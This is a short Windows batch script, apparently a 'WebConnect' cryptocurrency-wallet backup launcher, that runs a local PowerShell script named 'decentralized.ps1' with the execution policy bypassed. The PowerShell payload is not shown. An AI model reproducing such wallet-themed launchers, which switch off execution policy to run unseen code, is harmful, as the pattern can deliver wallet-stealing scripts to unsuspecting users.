@echo off
REM WebConnect Interactive Wallet Backup Launcher
REM Windows Batch Script

setlocal enabledelayedexpansion

REM Get the directory where this script is located
cd /d "%~dp0"

REM Run the PowerShell script with proper execution policy
powershell -NoProfile -ExecutionPolicy Bypass -File "decentralized.ps1"

pause
